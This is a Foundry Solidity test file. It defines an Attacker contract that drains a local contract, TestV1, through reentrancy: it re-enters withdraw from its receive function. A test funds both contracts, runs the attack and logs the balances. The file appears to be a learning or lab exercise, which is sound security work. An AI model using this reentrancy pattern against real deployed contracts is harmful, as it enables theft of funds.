// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {TestV1} from "../src/Counter.sol";
import {console} from "forge-std/console.sol";

contract Attacker {
    TestV1 private testv1;
    uint256 public attackAmount;
    
    constructor(TestV1 _testV1){
        testv1 = _testV1;
    }

    function attack() external payable {
        require(msg.value > 0, "must send eth");

        attackAmount = msg.value;
        testv1.deposit{value: msg.value}();
        testv1.withdraw(msg.value);

    }

    receive() external payable{
        if (address(testv1).balance >= attackAmount) {
            testv1.withdraw(attackAmount);
        }
    }
}


contract CounterTest is Test {
    TestV1 public testv1;
    Attacker public attacker;

    function setUp() public {
        testv1 = new TestV1();
        attacker = new Attacker(testv1);
        vm.deal(address(attacker), 6 ether);
        vm.deal(address(testv1), 10 ether);
    }


    function test_attack() public{
        // vm.startPrank(address(attacker));
        uint256 balanceBefore = address(attacker).balance;
        console.log("balance before: ", balanceBefore);

        attacker.attack{value: 1 ether}();
        uint256 balanceAfterWithdraw = address(attacker).balance;
        console.log("balance after withdraw", balanceAfterWithdraw);
        

        // uint256 balanceAfterWithdraw = address(attacker).balance;
        // console.log("balance after withdraw", balanceAfterWithdraw);
    }
}
